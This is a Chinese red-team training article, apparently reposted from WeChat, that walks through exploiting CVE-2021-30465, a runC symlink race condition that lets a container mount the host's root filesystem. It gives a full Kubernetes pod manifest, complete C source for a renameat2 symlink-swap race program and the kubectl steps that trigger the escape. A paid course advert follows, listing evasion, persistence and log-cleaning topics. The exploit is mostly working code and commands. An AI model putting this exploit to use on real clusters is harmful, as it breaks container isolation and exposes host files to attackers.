<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qMAAxUF7BPSosIjoWVA8ZQ)

********文章来源｜MS08067 红队攻防班********  

=====================================

> 本文作者：**BLACK**（红队攻防班讲师）

  
**场景介绍**  
runC 是⼀个 CLI ⼯具，⽤于根据 OCI 规范⽣成和运⾏容器，该⼯具被⼴泛的应⽤于各种虚拟化环境中，如 Kubernetes。  
该漏洞是由于挂载卷时，runC 不信任⽬标参数，并将使⽤ “filepath-securejoin” 库来解析任何符号链接并确保解析的⽬标在容器根⽬录中，但是如果⽤符号链接替换检查的⽬标⽂件时，可以将主机⽂件挂载到容器中。⿊客可利⽤该漏洞能将宿主机⽬录挂载到容器中，来实现容器逃逸。

**漏洞详情**  
在容器层⾯挂载卷和挂载⽬录是不⼀样的。  
挂载⽬录，对容器来说，只是简单把⽬录与容器的⽬录做映射绑定，⽽⽬录的权限还是在主机，需要⽤户⾃制维护，⼿动处理权限等问题。

卷 (Volume) 是受控存储，挂载卷后是由容器引擎进⾏管理维护的，也就是把对应卷的所有权交给了容器引擎（本次漏洞的核⼼点）

正常定义卷 A 之后 ，若 a 容器挂载了卷 A，那它同时也挂载了卷 A 下⾯的⽬录。

当 a 容器起来后，恶意程序疯狂的在挂载的⽬录下刷新软连接与⽬录的关系。与此同时若 b 容器也像 a 容器⼀样挂载了相同中的卷和对应卷下⾯的⽬录。

因为卷所有权这个时候是在引擎内，并且 a 容器相同卷下的⽬录还在刷新软连接（相同于创建软连接）这个时间在容器引擎内部就会存在资源竞争，形成了漏洞。

**环境搭建**  
漏洞环境准备：  

```
# docker
./metarget cnv install cve-2021-30465
# k8s
./metarget gadget install k8s --version 1.16.5 --domestic
```

在宿主机的 / ⽬录下建⽴ flag ⽂件

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9YFUMTWoZTBlXHBE6nSQrbgkhNru7rByrFFQaEt7icFr55VIdRsoeI1ufL6STEQb3aj9dtrRavuQQ/640?wx_fmt=png)

  
**漏洞复现**  
因为是利⽤竞争条件来进⾏利⽤的，有很⼤概率失败的。  
**步骤⼀：创建攻击 Pod**

```
sudo kubectl create -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
name: attack
spec:
terminationGracePeriodSeconds: 1
containers:
- name: c1
image: ubuntu:latest
command: [ "/bin/sleep", "inf" ]
env:
- name: MY_POD_UID
valueFrom:
fieldRef:
fieldPath: metadata.uid
volumeMounts:
- name: test1
mountPath: /test1
- name: test2
mountPath: /test2
$(for c in {2..20}; do
cat <<EOC
- name: c$c
image: donotexists.com/do/not:exist
command: [ "/bin/sleep", "inf" ]
volumeMounts: #容器内挂载点
- name: test1 #宿主机⽬录名
mountPath: /test1 #容器内⽬录名
- name: test2
mountPath: /test1/mnt1
- name: test2
mountPath: /test1/mnt2
- name: test2
mountPath: /test1/mnt3
- name: test2
mountPath: /test1/mnt4
- name: test2
mountPath: /test1/zzz
EOC
done
)
volumes:
- name: test1 #宿主机⽬录名

emptyDir: #宿主机挂载点
medium: "Memory"
- name: test2
emptyDir:
medium: "Memory"
EOF
```

**步骤⼆：编译恶意程序**  
保存以下代码为 race.c ⽂件并编译 gcc race.c -o race :

```
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/syscall.h>
#ifndef RENAME_EXCHANGE
#define RENAME_EXCHANGE (1 << 1)
#endif
int main(int argc, char *argv[]) {
if (argc != 4) {
fprintf(stderr, "Usage: %s name1 name2 linkdest\n", argv[0]);
exit(EXIT_FAILURE);
}
char *name1 = argv[1], *name2 = argv[2], *linkdest = argv[3];
int dirfd = open(".", O_DIRECTORY|O_CLOEXEC);
if (dirfd < 0)
exit(EXIT_FAILURE);
if (mkdir(name1, 0755) < 0)
perror("mkdir failed");
if (symlink(linkdest, name2) < 0)
perror("symlink failed");
while (1)
syscall(SYS_renameat2, dirfd, name1, dirfd, name2, RENAME_EXCHANGE);
}
```

  
**步骤三：执⾏恶意程序**  

将恶意程序拷⻉⾄ c1 容器内执⾏：  

```
kubectl cp race -c c1 attack:/test1/
```

然后进去容器创建符号链接：  

```
sudo kubectl exec -it attack -c c1 bash
ln -s / /test2/test2
```

进⼊ / test1 ⽬录下执⾏程序：

```
seq 1 4 | xargs -n1 -P4 -I{} ./race mnt{} mnt-tmp{}
/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/
```

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9YFUMTWoZTBlXHBE6nSQrbLBX3ko9oiaLDRPNgaKsq4PoxkVTQEn22BAiaGfd64EFadrPLzS1Q235g/640?wx_fmt=png)

  
接着更新 c2-c20 的容器镜像为合法镜像。新打开⼀个终端，执⾏以下命令更新镜像，⼀旦更新， pod 会尝试创建容器。

```
for c in {2..20}; do
sudo kubectl set image pod attack c$c=ubuntu:latest
done
```

执⾏以下命令查看漏洞是否利⽤成功：

```
for c in {2..20}; do
echo ~~ Container c$c ~~
sudo kubectl exec -ti pod/attack -c c$c -- ls /test1/zzz
done
```

若利⽤成功，会打印出 / test1/zzz ⽬录下的内容，也即宿主机根⽬录的内容：  

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9YFUMTWoZTBlXHBE6nSQrbjhyWic2QQwZ3yBJFzOwEY3d1ibjtyfb1z7bViaicfsEntknkL0U4bhnRMQ/640?wx_fmt=png)

  
**参考⽂献**  
https://blog.champtar.fr/runc-symlink-CVE-2021-30465/  
https://mp.weixin.qq.com/s/WRRjLKk_C9pq2WlvnA-NZQ  

**1.7** **号** ****红队攻防 第 5 期  最后来袭****

**课程费用**

每期班定价 **2999**，**第五期班****早鸟****价****：****2499**（前 40 名送 499 元内网知识星球名额），**每个报名学员都可享受一次免费重听后续任意一期班的权益**，一次没学懂就再来一遍！  

培训采用在线直播 + 随堂录播 + 作业 + 微信群讲师解答的形式，无需等待，报名后立即进入 “内网星球” 开始预习。毕业推荐 HW，推荐就业，有永久录播，报一期班可免费再参加后续任意一期班，内部 VIP 学习群永久有效。（可开发票，支付信用卡、花呗分期）  

**全新课程目录 5.0 版**

<table><tbody><tr><td width="113">第 1 天课</td><td width="464.3333333333333"><strong>信息收集总体概念<br>被动信息收集</strong><br>信息收集的总体概念以及在整个红队流程中的位置；<br>被动信息收集的基本结构和基本逻辑；<br>被动信息收集的常见手段（网络空间搜索、被动信息收集工具、传统搜索）；<br>被动信息收集后的信息处理；<br>被动信息收集工具的底层原理以及如何编写；</td></tr><tr><td width="113">第 2 天课</td><td width="464.3333333333333"><strong>主动信息收集</strong><br>信息收集完成之后的信息综合处理<br>主动信息收集的基本结构和基本逻辑；<br>主动信息收集的常见手段（仅限扫描的 nmap 和扫描带有 poc 的 goby）；<br>主动信息收集后的信息处理；<br>主动信息收集工具的底层原理以及如何编写；<br>如何将主动信息收集和被动信息收集的信息综合处理；<br>收集到的信息如何衔接到下一步的红队流程中；<br></td></tr><tr><td width="113">第 3 天课</td><td width="464.3333333333333"><strong>社会工程学</strong><br>社会工程学的含义以及实际应用；<br>社会工程学的知识体系；<br>社会工程学的学习方法；<br></td></tr><tr><td width="113">第 4 天课</td><td width="464.3333333333333"><strong>社会工程学中的交互</strong><br>社会工程学中的常见钓鱼方式以及应用；<br>社会工程学中如何根据收集到的信息利用目标的社会属性弱点进行交互；<br>社会工程学中的信任获得和信任利用方式；</td></tr><tr><td width="113">第 5 天课</td><td width="464.3333333333333"><strong>实战中的快速审计</strong><br>寻找源码中的多种途径；<br>快速查找源码中可利用的脆弱点；<br>使用工具发现脆弱点；<br></td></tr><tr><td width="113">第 6 天课</td><td width="464.3333333333333"><strong>POC 的编写</strong><br>Java 类与对象的概念；<br>Java 中基础语法的学习；<br>POC 编写应具备的哪些条件；<br>Idea 工具的安装；</td></tr><tr><td width="113">第 7 天课</td><td width="464.3333333333333"><strong>POC 的编写</strong><br>本地 IO 进行内容读写；<br>网络请求进行发包模拟；<br>POC 实战；<br></td></tr><tr><td width="113">第 8 天课</td><td width="464.3333333333333"><strong>Windows 内网提权</strong><br>Potato 家族提权；补丁提权；系统配置错误提权；<br>第三方服务提权；组策略提权；Bypassuac；<br>数据库提权；令牌窃取；密码收集提权；</td></tr><tr><td width="113">第 9 天课</td><td width="464.3333333333333"><strong>Liunx 内网提权</strong><br>系统内核提权；第三方服务提权；<br>数据库提权；密码收集提权；<br>键盘记录提权；Suid 提权；<br>Sudo 提权；反弹 shell 提权；</td></tr><tr><td width="113">第 10 天课</td><td width="464.3333333333333"><strong>内网穿透</strong><br>内网穿透概述及正向代理和反向代理；<br>花生壳内网穿透；Frp 内网穿透；<br>Ngrok 内网穿透；reGeorg+Proxifier；<br>向日葵代理及 teamviewer；<br>最小化渗透概述；云函数；域前置；</td></tr><tr><td width="113">第 11 天课</td><td width="464.3333333333333"><strong>外网打点技巧和 Kerberos 认证</strong><strong>原理</strong><br>入口权限获取；java 中间件 Nday；<br>php 集成环境；开源程序 Nday；<br>边界网络设备利用；基础服务 getshell；<br>kerberos 认证；kerberos 认证流程；</td></tr><tr><td width="113">第 12 天课</td><td width="464.3333333333333"><strong>域内信息收集及域信任</strong><br>域内信息收集概述；<br>域内用户组收集；域信任关系收集；<br>用户目录收集；预控日志收集；<br>Arp 信息收集；Tcpdump；Sshkey 收集；<br>铭感配置读取；网络拓扑架构分析判断；</td></tr><tr><td width="113">第 13 天课</td><td width="464.3333333333333"><strong>域渗透工具实操实战</strong><br>Setspn；Nslookup；AdFind；<br>Psloggendon；360safebrowserdecrypt；<br>SchtaskBackDoorWebshell；regeditBypassUAC；</td></tr><tr><td width="113">第 14 天课</td><td width="464.3333333333333"><strong>票据伪造、域委派攻击</strong>、<strong>域控攻击</strong><br>PTH 认证过程解析；票据伪造攻击原理；<br>Mimikatz 实现票据伪造攻击；<br>域委派原理；域委派攻击方法；<br>zerologin；nopac</td></tr><tr><td width="113">第 15 天课</td><td width="464.3333333333333"><strong>域林渗透</strong><br>域林渗透概述和父域子域及域信任关系分析；大型域渗透思路；<br>预控定位；Pth 喷射；域信任攻击；<br>组策略漏洞；Web 及系统漏洞；逃逸漏洞；</td></tr><tr><td width="113">第 16 天课</td><td width="464.3333333333333"><strong>Windows 权限维持</strong><br>Windows 权限维持概述及隐藏技巧；关闭杀软；<br>注册表自启动；组策略脚本；<br>计划任务；服务自启动；<br>内存码；进程劫持；隐蔽隧道；</td></tr><tr><td width="113">第 17 天课</td><td width="464.3333333333333"><strong>Liunx 权限维持</strong><br>Liunx 权限维持概述及隐藏技巧；<br>添加用户；SUIDshell；<br>SSH 公私钥；软连接；<br>crontab 计划任务；Strace 后门；Openssh 后门；<br>隐蔽隧道；关杀软；<br></td></tr><tr><td width="113">第 18 天课</td><td width="464.3333333333333"><strong>痕迹清理</strong><br>Windows 操作系统的痕迹清理；<br>Windows 痕迹清理的基本思路和思考逻辑；<br>Windows 清理登录痕迹、操作痕迹及时间痕迹；<br>Linux 操作系统的痕迹清理；<br>Linux 痕迹清理的基本思路和思考逻辑；<br>Linux 清理登录痕迹、操作痕迹及时间痕迹；</td></tr><tr><td width="113">第 19 天课</td><td width="464.3333333333333"><strong>红队之反溯源</strong><br>工作机器；攻击资源；匿名攻击；<br>识别反制；反溯源案例；</td></tr><tr><td width="113">第 20 天课</td><td width="464.3333333333333"><strong>Meterpreter 木马分析</strong><br>反编译 meterprter 源码；<br>分析 meterpreter 源码；<br>源码级别免杀深入浅出；<br></td></tr></tbody></table><table><tbody><tr><td width="113">第 21 天课</td><td width="464.3333333333333"><strong>文件的免杀</strong><br>免杀中使用的编程语言及相关知识基础<br>程序的基本结构；<br>c++ 免杀中用到的基础；<br>python 免杀中用到的基础；<br>win32api 基础；<br>使用 c++ 编写最基本的 socket；<br>使用 python 编写最基本的 socket；<br></td></tr><tr><td width="113">第 22 天课<br></td><td width="464.3333333333333"><strong>文件的免杀</strong><br>免杀中使用的编程语言及相关知识基础；<br>payload 的基本结构和编程语言的实战；<br>payload 的基本结构（以 MSFf 和 CS 举例）；<br>c2 的基本原理；<br>使用 c++ 编写最基本的 shellcode 加载器；<br>使用 python 编写最基本的 shellcode 加载器；<br></td></tr></tbody></table><table><tbody><tr><td width="113">第 23 天课</td><td width="464.3333333333333"><strong>文件的免杀</strong><br>杀毒软件的基本原理以及绕过思路<br>针对火绒的静态分析的特点分析及绕过思路；<br>针对 windowsdefender 的 shellcode 特征码的特点分析及绕过思路；<br>针对 360 的动态分析的特点分析及绕过思路；<br>针对人工分析的绕过以及处理；<br></td></tr><tr><td width="113">第 24 天课<br><br>第 25 天课<br>第 26 天课<br></td><td width="464.3333333333333"><strong>实际红队案例分享、红队攻击思路</strong><br>红队模拟面试；<br>实际红队案例分享；<br>红队攻击思路；<br><strong>红队靶场实战演练讲解</strong><br><br><strong>真实环境红蓝对抗</strong><br>针对国内环境下的云服务提供商的生产环境，将本期同学分为 AB 两队，每支队伍都拥有一个目标，为了模拟真实环境将采用两个不同的云服务提供商（不透露具体厂商），每一个环境都将开启不同的对外公开的服务（为避免模拟本地来攻击对方，服务的种类和数量都不相同），讲师会模拟普通用户来使用两队的环境，攻击之前我会私聊 AB 两队队长相关登录环境，队长也要私聊我队员的攻击机的公网 ip 方便识别是否犯规，实战开始时向对方公布环境地址。<br></td></tr></tbody></table>

* 大纲仅作为参考，会根据当期进度有所变化。  

**报名咨询联系小客服**  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaic7PmuiclIvD4GdJTRLwCZx3icnFdNc5iatEKWoEwtDiaQaiahUm6fj8nboPicd9vddIo3SYQrqQibtMUwbw/640?wx_fmt=jpeg)  

扫描下方二维码加入星球学习

加入后会邀请你进入内部微信群，内部微信群永久有效！

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cniaUZzJeYAibE3v2VnNlhyC6fSTgtW94Pz51p0TSUl3AtZw0L1bDaAKw/640?wx_fmt=png) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cT2rJYbRzsO9Q3J9rSltBVzts0O7USfFR8iaFOBwKdibX3hZiadoLRJIibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicBVC2S4ujJibsVHZ8Us607qBMpNj25fCmz9hP5T1yA6cjibXXCOibibSwQmeIebKa74v6MXUgNNuia7Uw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cRey7icGjpsvppvqqhcYo6RXAqJcUwZy3EfeNOkMRS37m0r44MWYIYmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicjovru6mibAFRpVqK7ApHAwiaEGVqXtvB1YQahibp6eTIiaiap2SZPer1QXsKbNUNbnRbiaR4djJibmXAfQ/640?wx_fmt=jpeg) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicJ39cBtzvcja8GibNMw6y6Amq7es7u8A8UcVds7Mpib8Tzu753K7IZ1WdZ66fDianO2evbG0lEAlJkg/640?wx_fmt=png)  

目前 50000 + 人已关注加入我们  
![](https://mmbiz.qpic.cn/mmbiz_gif/XWPpvP3nWa9FwrfJTzPRIyROZ2xwWyk6xuUY59uvYPCLokCc6iarKrkOWlEibeRI9DpFmlyNqA2OEuQhyaeYXzrw/640?wx_fmt=gif)